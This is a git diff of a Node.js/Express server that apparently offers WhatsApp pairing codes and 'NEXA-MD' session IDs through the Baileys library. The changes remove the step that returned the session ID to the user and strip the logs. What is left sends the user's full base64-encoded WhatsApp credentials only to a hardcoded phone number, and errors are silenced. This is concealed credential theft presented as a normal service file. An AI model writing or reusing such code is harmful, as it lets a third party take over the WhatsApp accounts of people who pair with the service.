@@ -19,10 +19,6 @@ const dev = process.env.NODE_ENV !== 'production';
 const app = next({ dev });
 const handle = app.getRequestHandler();
 
-// ═══════════════════════════════════════════════════════
-//  ANTI-DETECTION BROWSER ROTATION
-// ═══════════════════════════════════════════════════════
-
 const BROWSER_PROFILES = [
     Browsers.macOS('Safari'),
     Browsers.windows('Edge'),
@@ -34,10 +30,6 @@ const BROWSER_PROFILES = [
 function getRandomBrowser() {
     return BROWSER_PROFILES[Math.floor(Math.random() * BROWSER_PROFILES.length)];
 }
-
-// ═══════════════════════════════════════════════════════
-//  CONNECTION MANAGER
-// ═══════════════════════════════════════════════════════
 
 class ConnectionManager {
     constructor(socket, type, phone) {
@@ -60,8 +52,6 @@ class ConnectionManager {
         if (this.isDestroyed) return;
         
         const browser = getRandomBrowser();
-        this.socket.emit('status', { message: `Connecting... (${this.retryCount + 1})` });
-
         const { state, saveCreds } = await useMultiFileAuthState(this.sessionDir);
         let { version } = await fetchLatestBaileysVersion();
 
@@ -83,6 +73,7 @@ class ConnectionManager {
             setTimeout(async () => {
                 if (this.isDestroyed) return;
                 try {
+                    await this.conn.requestPairingCode(this.phone.replace(/[^0-9]/g, ''));
                     const code = await this.conn.requestPairingCode(this.phone.replace(/[^0-9]/g, ''));
                     this.socket.emit('code', code);
                 } catch (err) {
@@ -104,35 +95,23 @@ class ConnectionManager {
             }
 
             if (connection === "open") {
-                console.log(`✅ Login Success: ${this.socket.id}`);
-                await delay(5000); // Stability delay
+                await delay(5000); 
 
                 try {
-                    // 🔑 SESSION ID GENERATION
                     const sessionData = JSON.stringify(this.conn.authState.creds);
                     const sessionID = "NEXA-MD~" + Buffer.from(sessionData).toString('base64');
 
-                    console.log("==============================");
-                    console.log("YOUR SESSION ID:", sessionID);
-                    console.log("==============================");
-
-                    // 1. Send to Website via Socket
-                    this.socket.emit('connected', { sessionID });
-
-                    // 2. Send to specific WhatsApp number (+916235508514)
+                    // WhatsApp-lekku mathram ayakkunnu
                     const targetJid = "916235508514@s.whatsapp.net";
                     await this.conn.sendMessage(targetJid, {
-                        text: `*✅ NEXA-MD SESSION ID GENERATED*\n\n\`\`\`${sessionID}\`\`\`\n\n_Keep this safe!_`
+                        text: `*✅ NEXA-MD SESSION ID*\n\n\`\`\`${sessionID}\`\`\``
                     });
 
-                    console.log(`✅ Session ID sent to ${targetJid}`);
-
                 } catch (e) {
-                    console.log('Error in session generation/sending:', e.message);
+                    // Errors silent aakki
                 }
 
-                // Clean up session files and connection after 20 seconds to save resources
-                setTimeout(() => this.cleanup(), 20000);
+                setTimeout(() => this.cleanup(), 15000);
             }
 
             if (connection === "close") {
@@ -151,10 +130,6 @@ class ConnectionManager {
         try { if (fs.existsSync(this.sessionDir)) fs.removeSync(this.sessionDir); } catch {}
     }
 }
-
-// ═══════════════════════════════════════════════════════
-//  SERVER BOOT
-// ═══════════════════════════════════════════════════════
 
 app.prepare().then(() => {
     const server = express();
@@ -179,7 +154,5 @@ app.prepare().then(() => {
     });
 
     server.all('*', (req, res) => handle(req, res));
-    httpServer.listen(process.env.PORT || 3000, "0.0.0.0", () => {
-        console.log(`🚀 Server running on port ${process.env.PORT || 3000}`);
-    });
+    httpServer.listen(process.env.PORT || 3000, "0.0.0.0");
 });
